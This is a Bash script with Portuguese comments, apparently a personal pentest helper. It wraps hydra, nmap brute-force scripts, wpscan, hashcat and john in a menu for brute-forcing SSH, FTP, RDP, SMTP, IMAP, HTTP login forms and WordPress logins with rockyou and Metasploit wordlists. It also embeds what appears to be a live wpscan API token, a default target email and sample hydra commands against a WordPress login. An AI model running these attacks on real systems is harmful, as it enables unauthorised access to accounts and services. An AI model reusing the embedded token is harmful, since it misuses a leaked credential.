#!/bin/bash
#!/bin/bash
########## HELP
# Usage
##### HELP
########## TODO
# -b, bind
# -r, reverse
# -s, staged
# -t, tipo, msvenon, bashsocket
##### TODO
########## Import Libs

# bind
# reverse
# stage
# stageless

# escutar porta
# conectar numa porta
# envia bash para outro local
    # socket
    # nc
# shell melhorado
    # pawncat
    # rlwrap
    # python, mostra na tela

########## FUNCTIONS
# Functions
# if not set, ask for it and set it
var_check() {
	local count=1
	for i in "$@"; do
		var_name=$i
		var_value=${!var_name}
		if [ -z "$var_value" ]; then
			read -p "$count. Type the $var_name: " var_value
			eval "$var_name=$var_value"
			((count++))
		fi
	done
}

select_wordlist(){
	# find -L /usr/share/wordlists -type f -exec du -sk {} \; | sort -n | awk '{print $1 "KB\t" $2}' > $HOME/AppStorage/Security/Wordlists/wordlists_kali.txt
	if [ -z $wordlist ]; then
		[ -z $wsubject ] && read -p "Digite o tema da wordlist: " wlsubject || wlsubject=${wsubject}
		kali_wl="$HOME/AppStorage/Security/Wordlists/wordlists_kali.txt"
		oldIFS=$IFS
		IFS=$'\n'; options=( $(cat "$kali_wl" | grep "$wlsubject" ) )
		select opt in "${options[@]}"; do
			echo $opt | cut -f 2-
			break
		done
		IFS=$oldIFS
	else
		echo "$wordlist"
	fi
}

set_colors(){
	cred="\e[31m"
	cgreen="\e[32m"
	cyellow="\e[33m"
	cblue="\e[34m"
	cpurp="\e[35m"
	cwhite="\e[36m"
	creset="\e[0m"
}
set_colors

centerPrint (){
	local color1=${3:-cblue}
	local color2=${4:-cwhite}
	local text=${1:-"STEP"}
	local char=${2:-"."}
	width=$(tput cols)
	width_sides=$(( ( $width - ${#text} )/2 - 1))
	printf -v side "%*s" "$(( $width_sides/${#char} ))" ""; side=${side// /"$char"};
	printf "%b %b %b\n" "${!color1}$side$def" "${!color2}${text}${creset}" "${!color1}$side$creset"
}

print_status(){
	if [ "$1" -eq 0 ]; then
		echo -e "${cgreen}[  OK  ]${creset} $2"
	else
		echo -e "${cred}[ FAIL ]${creset} $2"
	fi
}

select_user_or_password (){
	if [ -z $username ] && [ -z $password ]; then
		echo "Which one will be fixed? username, password or none?" && \
		select opt in username password none; do
			case $opt in
				username)
					[ -z $passwords ] && passwords=$(select_wordlist $wsubject)
					var_check username
				;;
				password)
					[ -z $usernames ] && usernames=$(select_wordlist $wsubject)
					var_check password
				;;
				both)
					[ -z $usernames ] && usernames=$(select_wordlist $wsubject)
					[ -z $passwords ] && passwords=$(select_wordlist $wsubject)
				;;
			esac
			break
		done
	else
		if [ -z $username ]; then
			[ -z $usernames ] && usernames=$(select_wordlist $wsubject)
			var_check password
		else
			[ -z $passwords ] && passwords=$(select_wordlist $wsubject)
			var_check username
		fi
	fi
}

bf_http(){
    host=$1
    wordlist=$2
    username=$3
    service=$4
    password=$5

    endereco="/otrs/index.pl"
    actionok="Action=Login&RequestedURL=&Lang=en&TimeOffset=300&User=^USER^&Password=^PASS^:F=Login"
    messageFail="failed\!"
    hydra ${host} http-form-post "${url:-"$endereco:$actionok $messageFail"}" -l "${username:-'andrutza@alunmaq.com'}" -P "${wordlist:-'/usr/share/wordlists/rockyou.txt'}" -v

    hydra -l $user -P $wordlist $host $service
    
    # wfuzz -z file,/root/users.txt -z file,/u/;big -hs "usuario ou senha incorretos" "irç login FUZZ senhaFUZ2Z"
}

break_hash(){
    # wordlist=${1:-'/usr/share/wordlists/rockyou.txt'}
	var_check filename extra
	set -x
    hashcat $filename ${wordlist:-$(select_wordlist)} $extra
	set +x
    echo 'Se não der, use o:
    john -wordlist=${wordlist:-"/usr/share/wordlists/rockyou.txt"} ${hash:-"hash_completo.txt"}'
	set -x
	john -wordlist=${wordlist:-"/usr/share/wordlists/rockyou.txt"} ${filename:-"hash_completo.txt"}
	set +x
}

bf_services () {
	centerPrint "$FUNCNAME" "#"
	# handle_cli_options "$@"
	echo -e "
	1) Normalmente feito com uma lista de usuarios contra uma senha ou o contrário.
	"
    [ -z $service ] && select service in "ssh" "ftp" "rdp" "smtp" "imap" "http"; do break; done
	# var_check application 
	case ${application:="hydra"} in
        nmap)
            if [ ! -z $passwords ]; then
                passorlist=passwords
                userorlist=username
                brutemode="user"
            else
                passorlist=password
                userorlist=usernames
                brutemode="pass"
            fi
            var_check $userorlist $passorlist target_host service extra
            case $service in
                ssh)
                    nmap -p 22 --script ssh-brute --script-args brutemode=$brutemode userdb=${!userorlist:-"/usr/share/wordlists/metasploit/unix_users.txt"},passdb=${!passorlist:-"/usr/share/wordlists/metasploit/unix_passwords.txt"},brute.firstOnly $target_host
                ;;
                ftp)
                    nmap -p 21 --script ftp-brute --script-args userdb=${usernames:-"/usr/share/wordlists/metasploit/unix_users.txt"},passdb=${passwords:-"/usr/share/wordlists/metasploit/unix_passwords.txt"},brute.firstOnly $target_host
                ;;
                rdp)
                    nmap -p 3389 --script rdp-brute --script-args userdb=${usernames:-"/usr/share/wordlists/metasploit/unix_users.txt"},passdb=${passwords:-"/usr/share/wordlists/metasploit/unix_passwords.txt"},brute.firstOnly $target_host
                ;;
                smtp)
                    nmap -p 25 --script smtp-brute --script-args userdb=${usernames:-"/usr/share/wordlists/metasploit/unix_users.txt"},passdb=${passwords:-"/usr/share/wordlists/metasploit/unix_passwords.txt"},brute.firstOnly $target_host
                ;;
                imap)
                    nmap -p 143 --script imap-brute --script-args userdb=${usernames:-"/usr/share/wordlists/metasploit/unix_users.txt"},passdb=${passwords:-"/usr/share/wordlists/metasploit/unix_passwords.txt"},brute.firstOnly $target_host
                ;;
                http)
                    nmap -p 80 --script $service-brute --script-args userdb=${usernames:-"/usr/share/wordlists/metasploit/unix_users.txt"},passdb=${passw   ords:-"/usr/share/wordlists/metasploit/unix_passwords.txt"},brute.firstOnly $target_host
                ;;
            esac
        ;;
		hydra)
            if [ ! -z $passwords ]; then
                passorlist=passwords
                passcliopt="-P"
            else
                passorlist=password
                passcliopt="-p"
            fi

            if [ ! -z $usernames ]; then
                userorlist=usernames
                usercliopt="-L"
            else
                userorlist=username
                usercliopt="-l"
            fi
            var_check $userorlist $passorlist target_host service extra
            set -x
            hydra $usercliopt ${!userorlist} $passcliopt ${!passorlist} $target_host $service
            set +x
		;;
	esac
}

bf_wordpress (){	
	select_user_or_password


	var_check target_host
	local rhost=${target_host}
	local lworlist=${wordlist:-'/usr/share/wordlists/rockyou.txt'}

	if 	[ -z $username ] && [ -z $password ] && [ -z $passwords ] && [ -z $usernames ]; then
		centerPrint "Enumerando WP"
		set -x
		wpscan --url $rhost --api-token 0x1SMGS2c0JJefCKFjVv3Fhoq5rbYgHP6BFWtQ9LU3M --enumerate u
		set +x
	else
		centerPrint "BruteForce WP"
		set -x
		wpscan --url $host --api-token 0x1SMGS2c0JJefCKFjVv3Fhoq5rbYgHP6BFWtQ9LU3M -U ${username:-$usernames} -P ${password:-$passwords}
		set +x
	fi
}

# ssh bruteforce
bf_ssh (){	
	select_user_or_password
	# var_check application 
	case ${application:="hydra"} in
        nmap)
            [ -z $extra ] && \
            read -p "Type uri field: " uservar && \
            read -p "Type user field: " uservar && \
            read -p "Type passfield " passvar && \
            read -p "Type messageFail (failed\!): " messageFail && \
            extra="${uservar:-"password"}:${passvar:-"user"}:${messageFail:-"failed\!"}" || \
            uri="$( echo $extra | cut -d ':' -f 1 )" && \
            uservar="$( echo $extra | cut -d ':' -f 2 )" && \
            passvar="$( echo $extra | cut -d ':' -f 3 )" && \
            messageFail="$( echo $extra | cut -d ':' -f 4 )"
            
            var_check target_host service extra
            nmap -p80 --script http-form-brute.passvar=$passvar,http-form-brute.uservar=$uservar  http-form-brute --script-args http-form-brute.onfailure=$messageFail

            # nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.uri="/hidden-wp-login.php" localhost
			
			# hydra -l 'elliot' -p 'darlene' 192.168.93.28 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.93.28%2Fwp-admin%2F&testcookie=1:Invalid username, email address or incorrect password.'

        ;;
		*)
            if [ ! -z $passwords ]; then
                passorlist=passwords
                passcliopt="-P"
            else
                passorlist=password
                passcliopt="-p"
            fi

            if [ ! -z $usernames ]; then
                userorlist=usernames
                usercliopt="-L"
            else
                userorlist=username
                usercliopt="-l"
            fi
        
			var_check $userorlist $passorlist target_host
			set -x
			hydra $usercliopt ${!userorlist} $passcliopt ${!passorlist:=/usr/share/wordlists/metasploit/unix_passwords.txt} -t 6 ssh://$target_host
			set +x
		;;
	esac
}

bf_http_post_form () {
	centerPrint "$FUNCNAME" "#"
	# handle_cli_options "$@"
	echo -e "
	1) Normalmente feito com uma lista de usuarios contra uma senha ou o contrário.
	"
	select_user_or_password
	# var_check application 
	case ${application:="hydra"} in
        nmap)
            [ -z $extra ] && \
            read -p "Type uri field: " uservar && \
            read -p "Type user field: " uservar && \
            read -p "Type passfield " passvar && \
            read -p "Type messageFail (failed\!): " messageFail && \
            extra="${uservar:-"password"}:${passvar:-"user"}:${messageFail:-"failed\!"}" || \
            uri="$( echo $extra | cut -d ':' -f 1 )" && \
            uservar="$( echo $extra | cut -d ':' -f 2 )" && \
            passvar="$( echo $extra | cut -d ':' -f 3 )" && \
            messageFail="$( echo $extra | cut -d ':' -f 4 )"
            
            var_check target_host service extra port 
            nmap -p $port --script http-form-brute.passvar=$passvar,http-form-brute.uservar=$uservar  http-form-brute --script-args http-form-brute.onfailure=$messageFail

            # nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.uri="/hidden-wp-login.php" localhost
			
			# hydra -l 'elliot' -p 'darlene' 192.168.93.28 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.93.28%2Fwp-admin%2F&testcookie=1:Invalid username, email address or incorrect password.'

        ;;
		*)
            if [ ! -z $passwords ]; then
                passorlist=passwords
                passcliopt="-P"
            else
                passorlist=password
                passcliopt="-p"
            fi

            if [ ! -z $usernames ]; then
                userorlist=usernames
                usercliopt="-L"
            else
                userorlist=username
                usercliopt="-l"
            fi

            # [ -z $service ] && select service in "http-post-form" "http-get-form" "http-head"; do break; done
			service=http-post-form
            if [ -z $extra ]; then
            	read -p "Type url (/admin/usermanager/conecta.php): " url
            	read -p "Type actionok (usuario=^USER^&senha=^PASS^): " actionok
            	read -p "Type messageFail (failed\!): " messageFail
            	extra="${url:-"/otrs/index.pl"}:${actionok:-"User=^USER^&Password=^PASS^"}:${messageFail:-"failed\!"}"
			fi
        
			var_check $userorlist $passorlist target_host service extra port
			set -x
            hydra $usercliopt ${!userorlist} $passcliopt ${!passorlist} -f $target_host -s $port $service "$extra"
			set +x
		;;
	esac
}

print_header(){
	help_version="0.2"
	help_dependencies="ssh"
	# colors=( 45 34 94 97 44 ) # azul
	colors=( 43 31 91 94 42 ) # vermelho
	# colors=( 44 32 92 95 43 ) # verde
	# colors=( 45 33 93 96 44 ) # laranja
	# colors=( 46 35 95 98 45 ) # roxo
	# colors=( 48 36 96 99 46 ) # verde oliva
	echo "
	┌─────────────────────┐   [0;${colors[4]}m KK [0;0m[0;${colors[0]}m $(basename $0 .sh | sed "s/^kk//") [0;0m
	│[0;1;${colors[1]};${colors[2]}m╻┏[0m [0;1;${colors[1]};${colors[2]}m╻┏[0m [0;1;${colors[1]};${colors[2]}m╺┳╸┏━┓┏━┓╻[0m  [0;${colors[1]}m┏━┓[0m│   [1;${colors[3]}m Author:  Otávio Augusto[0;0m
	│[0;1;${colors[1]};${colors[2]}m┣┻┓┣┻┓[0m [0;1;${colors[1]};${colors[2]}m┃[0m [0;${colors[1]}m┃[0m [0;${colors[1]}m┃┃[0m [0;${colors[1]}m┃┃[0m  [0;${colors[1]}m┗━┓[0m│   [1;${colors[3]}m Contact: contact@oaugusto.pro[0;0m
	│[0;${colors[1]}m╹[0m [0;${colors[1]}m╹╹[0m [0;${colors[1]}m╹[0m [0;${colors[1]}m╹[0m [0;${colors[1]}m┗━┛┗━┛┗[0;37m━╸┗━┛[0m│   [1;${colors[3]}m Website: http://oaugusto.pro[0;0m
	└─────────────────────┘   [1;${colors[3]}m Social:  @oaugustopro[0;0m

	[0;100m ☕version [0;42m $help_version [0;0m [0;100m ✌license [0;42m MIT [0;0m 
	=================[0;0m [1;${colors[3]}m$(basename $0) execution[0;0m =================[0;0m
	Abre e informa sobre diversos tipos de shell

	Depends on ${help_dependencies}."  | sed -e "s/\t//g"

	echo -e "OPTIONS:" 
	# Show cli options
	cat "$0" | grep -Eo "[A-Za-z]) #.*" | sed "s/\#//g;s/)/,/g;s/^/-/g" | tr '\n' ';'
	echo -e "\nFUNCTIONS:"
	cat "$0" | sed -n '/#STARTOPTIONS1/,/#ENDOPTIONS1/p' | grep -Eo ".*[[:alnum:]]+)$" | tr -d ')\t' | tr -s ' ' | sort -u | cut -d '|' -f 2 | tr '\n' ';'
    echo -e "\n"
}

handle_cli_options (){
	while getopts "u:U:p:P:w:s:o:f:a:F:e:h:H:C:M:S:" option; do
		case $option in
			u) # username of target
			username="$OPTARG"
			;;
            U) # username list
			usernames="$OPTARG"
			;;
			p) # password
			password="$OPTARG"
			;;
			P) # password list
			passwords="$OPTARG"
			;;
			w) # wordlist
			wordlist="$OPTARG"
			;;
			s) # service
			service="$OPTARG"
			;;
			e) # extra options
			extra="$OPTARG"
			;;
			C) # login_pass file
			login_pass="$OPTARG"
			;;
			M) # server_list
			server_list="$OPTARG"
			;;
			F) # functions, below
			function="$OPTARG"
			;;
			o) # output filename
			output="$OPTARG"
			;;
			f) # input filename
			filename="$OPTARG"
			;;
			a) # application [ssh, nc, pwncat, chiselsrv chiselc, rlwrap, plink]
			application="$OPTARG"
			;;
			h) # host
			target_host="$OPTARG"
			;;
			H) # port
			port="$OPTARG"
			;;
			S) # subject of the wordlist
			wsubject="$OPTARG"
			;;
			*)
				echo "Opção Inválida"
			;;
		esac
	done
}

handle_input(){
	#STARTOPTIONS1
    case "$1" in
		*"Break HASH"|hash)
			break_hash
		;;
		*"SSH Login BF"|ssh)
			bf_ssh
		;;
		*"Mysql Login BF"|mysql)
			bf_mysql
		;;
		*"RDP Login BF"|rdp)
			bf_rdp
		;;
		*"SMTP Login BF"|smtp)
			bf_smtp
		;;
		*"IMAP Login BF"|imap)
			bf_imap
		;;
        *"HTTP POST Form BF"|http-post-form)
            bf_http_post_form
        ;;
		*"Wordpress"|wordpress)
            bf_wordpress
        ;;
		"Sair")
			exit 0
		;;
		*)
			echo "Invalid option $1"
		;;
	esac
	#ENDOPTIONS1
}
##### END FUNCTIONS
########## MAIN
# Main script
print_header
handle_cli_options "$@"
# Check if input is provided
if [ -n "$function" ]; then
    handle_input "$function"
else
    old_IFS=$IFS; IFS=$'\n'; options=( $(cat "$0" | sed -n '/#STARTOPTIONS1/,/#ENDOPTIONS1/p' | grep -Eo ".*[[:alnum:]]+)$" | tr -d '*)\t' | tr -s ' ' | tr -d \" | cut -d '|' -f1) ); IFS=$old_IFS
    echo -e "${cblue}* Select an option:$creset"
    select opt in "${options[@]}"; do
        handle_input "$opt"
    done
fi
##### END MAIN